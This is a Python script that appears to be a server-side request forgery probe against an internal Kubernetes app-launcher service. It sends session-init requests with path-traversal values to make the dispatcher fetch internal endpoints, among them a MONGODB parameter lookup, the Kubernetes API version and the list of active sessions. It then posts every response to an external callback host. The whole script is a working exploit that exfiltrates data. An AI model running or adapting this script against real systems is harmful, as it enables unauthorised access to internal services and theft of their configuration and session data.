import json, os, time, urllib.request, urllib.error
B='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
C=[
 ('ms_health','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../health'),
 ('ms_openapi','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../openapi.json'),
 ('ms_root','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../'),
 ('ms_param','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../get_param?param_key=MONGODB'),
 ('kube_version','https://kubernetes.default.svc','../../../../version'),
 ('kube_ip_version','https://172.20.0.1:443','../../../../version'),
 ('disp_health','http://127.0.0.1:8080','../../../../health'),
 ('disp_llm','http://127.0.0.1:8080','../../../../llm/health'),
 ('disp_sessions','http://127.0.0.1:8080','../../../../sessions'),
 ('disp_openapi','http://127.0.0.1:8080','../../../../openapi.json'),
]
O={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'host':os.uname().nodename,'cases':[]}
for n,h,p in C:
 body=json.dumps({'user_id':'ssrf-now-'+n+'@armorerlabs.com','host_url':h,'project_path':p,'project_id':'__mismatch__','force':True},separators=(',',':')).encode()
 q=urllib.request.Request(B+'/session/init',data=body,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 t=time.monotonic(); r={'name':n,'host':h,'path':p}
 try:
  with urllib.request.urlopen(q,timeout=10) as x:
   r.update(status=x.status,body=x.read(8000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e:
  r.update(status=e.code,body=e.read(8000).decode('utf-8','replace'))
 except Exception as e: r['error']=repr(e)
 r['ms']=round((time.monotonic()-t)*1000); O['cases'].append(r)
raw=json.dumps(O,sort_keys=True).encode()
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-ssrf-probe-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(q,timeout=20) as x: O['sink']={'status':x.status,'body':x.read(500).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e: O['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(O['sink'],sort_keys=True))
